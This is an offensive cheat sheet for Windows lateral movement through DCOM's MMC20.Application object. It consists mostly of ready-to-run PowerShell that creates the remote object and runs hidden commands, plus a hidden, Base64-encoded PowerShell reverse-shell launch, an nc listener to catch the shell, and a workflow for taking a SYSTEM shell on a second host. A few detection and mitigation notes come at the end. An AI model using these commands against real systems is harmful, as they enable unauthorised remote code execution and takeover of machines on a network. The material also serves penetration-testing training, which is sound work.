# **DCOM Lateral Movement Cheat Sheet**  
*Abuse Distributed Component Object Model (DCOM) for remote code execution.*  

---

#### **Conditions for Success**  
1. **Local Admin Rights**:  
   - Attacker must have **local admin privileges** on the target.  
2. **Network Access**:  
   - **Port 135/TCP (RPC)** open between attacker and target.  
3. **DCOM Enabled**:  
   - DCOM must be enabled (default on Windows).  

---

### **Steps & Examples**  

#### **1. Instantiate DCOM Object**  
*Use PowerShell to create a remote MMC Application object:*  
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))
```  
- Replace `<TARGET_IP>` with the target machine’s IP/hostname.  

---

#### **2. Execute Commands**  
*Leverage the `ExecuteShellCommand` method to run commands:*  
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
```  
- **Command**: `cmd` (executes `calc` via `/c calc`).  
- **WindowState**: `"7"` (hidden window).  

---

#### **3. Reverse Shell (Advanced)**  
**Step 1: Generate Base64 Payload**  [PowerShell_RCE](https://github.com/MGamalCYSEC/ReverseShellCrafter/tree/main/PowerShell)
**Step 2: Execute Payload via DCOM**  
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-nop -w hidden -e <BASE64_PAYLOAD>", "7")
```  
- Replace `<BASE64_PAYLOAD>` with your encoded shell.  

---

### **Verification**  
**On Target**:  
```powershell
tasklist | findstr "win32calc"   # Verify process execution.
```  
**On Attacker**:  
```bash
nc -lnvp 443   # Catch reverse shell.
```  

---

### **Tools & Commands**  
| **Task**               | **Command**                                                                 |  
|-------------------------|-----------------------------------------------------------------------------|  
| **Basic Command**       | `ExecuteShellCommand("cmd", $null, "/c <COMMAND>", "7")`                   |  
| **Reverse Shell**       | Use `msfvenom` to generate payload + inject via DCOM.                      |  

---

### **Key Notes**  
- **Session 0 Execution**:  
  - Commands run in **Session 0** (non-interactive). Use `-WindowStyle Hidden` for stealth.  
- **Detection**:  
  - **Event ID 4688**: Process creation from `mmc.exe` or `DllHost.exe`.  
  - **Network**: Traffic on port 135 (RPC).  
- **Mitigation**:  
  - Disable DCOM via `dcomcnfg` > Component Services > Computers > My Computer > Properties > COM Security > Disable DCOM.  
  - Restrict local admin privileges.  

---

### **Example Workflow**  
1. **Compromise a workstation** (e.g., `CLIENT74`) as a local admin.  
2. **Instantiate DCOM object** targeting `FILES04` (192.168.50.73).  
3. **Execute `calc`** to verify access.  
4. **Generate a reverse shell** and gain a SYSTEM shell on `FILES04`.  

---

### **References**  
- [Microsoft DCOM Docs](https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model)  
- [Cybereason DCOM Research](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)  
